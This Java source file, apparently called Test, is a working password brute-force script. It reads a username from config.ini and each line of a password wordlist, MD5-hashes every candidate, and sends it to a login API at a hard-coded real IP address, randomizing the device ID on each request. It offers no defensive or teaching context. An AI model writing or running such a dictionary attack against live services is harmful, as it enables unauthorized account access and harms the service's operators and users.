package com.baimsg;


import com.baimsg.network.HttpUtils;
import com.baimsg.utils.SafetyUtil;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.HashMap;
import java.util.Properties;
import java.util.UUID;

public class Test {

    public static void main(String[] args) {
        HashMap<String, String> headers = new HashMap<>();
        headers.put("Accept", "application/json");
        headers.put("Content-Type", "application/json");
        headers.put("version", "1.0.0");
        headers.put("device", "0");
        headers.put("sendTime", System.currentTimeMillis() + "");
        headers.put("lite-x-version", "register");
        headers.put("Host", "139.159.244.191:7799");
        Properties properties = new Properties();
        try {
            properties.load(Test.class.getResourceAsStream("/config.ini"));
            String name = properties.getProperty("userName");
            BufferedReader br = new BufferedReader(
                    new FileReader(
                            Test.class.getResource("/password.ini").getFile()
                    )
            );
            String s;
            while ((s = br.readLine()) != null) {
                System.out.println(HttpUtils.build().
                        exePost("http://139.159.244.191:7799/auth/login/userName",
                                getParma(name, SafetyUtil.md5(s)),
                                headers
                        )
                );
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static String getParma(String userName, String userPw) {
        System.out.print(userPw+"\t");
        JSONObject res = new JSONObject();
        res.put("latitude", "");
        res.put("longitude", "");
        res.put("device", "0");
        res.put("userName", userName);
        res.put("userPw", userPw);
        res.put("deviceID", UUID.randomUUID().toString());
        return res.toString();
    }
}
